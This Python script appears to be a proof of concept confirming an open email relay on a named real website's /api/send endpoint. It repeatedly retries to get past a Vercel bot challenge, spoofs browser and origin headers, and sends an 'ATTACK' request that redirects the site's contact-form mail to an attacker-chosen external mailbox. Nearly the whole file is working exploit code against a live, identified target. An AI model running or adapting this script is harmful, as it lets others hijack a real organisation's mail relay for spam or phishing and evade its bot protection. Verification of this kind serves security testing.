#!/usr/bin/env python3
"""
Independent re-verification of: unauthenticated open email relay at POST /api/send
(attacker-controlled `targets` recipient).
Only touches the in-scope target. Retries through the intermittent Vercel BotID
challenge to reach the real application layer.
"""
import sys, time, json, urllib.parse, random

TARGET = "https://www.infinitycapital.bh/api/send"
UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
      "(KHTML, like Gecko) Version/17.0 Safari/605.1.15")
BASE = {"fname": "Verif", "lname": "Checker", "areacode": "+973",
        "tel": "3600000", "cname": "Relay Verify",
        "subject": "Security Verification Probe",
        "msg": "Automated independent verification of recipient control.",
        "check": "on"}


def send(fields, tries=12, delay=2.5):
    """POST multipart/form-data (as the real client does). Returns (resp, log)."""
    log = []
    boundary = "----VrfBoundary%s" % random.randint(10**9, 10**10)
    parts = []
    for k, v in fields.items():
        parts.append("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                     % (boundary, k, v))
    parts.append("--%s--\r\n" % boundary)
    body = "".join(parts).encode()
    for i in range(tries):
        try:
            import http.client
            from urllib.parse import urlsplit
            u = urlsplit(TARGET)
            conn = (http.client.HTTPSConnection if u.scheme == "https"
                    else http.client.HTTPConnection)(u.netloc, timeout=30)
            conn.request("POST", u.path,
                         body=body,
                         headers={"User-Agent": UA,
                                  "Content-Type": "multipart/form-data; boundary=%s" % boundary,
                                  "Accept": "*/*",
                                  "Accept-Language": "en-US,en;q=0.9",
                                  "Origin": "https://www.infinitycapital.bh",
                                  "Referer": "https://www.infinitycapital.bh/contact",
                                  "Content-Length": str(len(body))})
            r = conn.getresponse()
            data = r.read().decode("utf-8", "replace")
            hdrs = dict(r.getheaders())
            conn.close()
            entry = (i, r.status, hdrs.get("x-vercel-mitigated", "-"), data[:500])
            log.append(entry)
            if r.status != 403 or "challenge" not in data:
                return (r.status, hdrs, data), log
        except Exception as e:
            log.append((i, "EXC", "-", repr(e)[:200]))
        time.sleep(delay)
    return (None, {}, ""), log


def show(tag, res, log):
    st, hdrs, data = res
    print("[%s] attempts=%d" % (tag, len(log)))
    for e in log[:6]:
        print("   attempt %s -> status=%s mitigated=%s" % (e[0], e[1], e[2]))
    print("   FINAL status=%s" % st)
    if hdrs:
        for k in ("x-vercel-mitigated", "content-type", "x-matched-path", "server"):
            if k in hdrs:
                print("   hdr %s: %s" % (k, hdrs[k]))
    print("   BODY: %s" % (data[:600] if data else "<empty>"))
    print()


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    f = dict(BASE)
    if which in ("all", "own"):
        f["targets"] = "info@infinitycapital.bh"   # legitimate site recipient
        show("BASELINE targets=info@infinitycapital.bh (site owner)",
             *send(f))
    if which in ("all", "ext"):
        f2 = dict(BASE)
        f2["targets"] = "probe-9f2c1a@web2mail.net"   # attacker-chosen external mailbox
        show("ATTACK targets=probe-9f2c1a@web2mail.net", *send(f2))
